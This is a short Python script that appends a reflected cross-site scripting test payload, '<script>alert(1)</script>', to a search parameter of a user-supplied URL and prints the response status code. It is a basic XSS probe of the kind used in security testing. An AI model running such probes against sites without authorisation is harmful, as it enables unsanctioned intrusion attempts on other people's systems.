import sys
import requests

def main():
    if len(sys.argv) != 2:
        print("Usage: python script.py <URL>")
        sys.exit(1)
    
    base_url = sys.argv[1]
    modified_url = base_url + "/?search=<script>alert(1)</script>"
    
    try:
        response = requests.get(modified_url)
        print(f"Modified URL: {modified_url}")
        print(f"Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
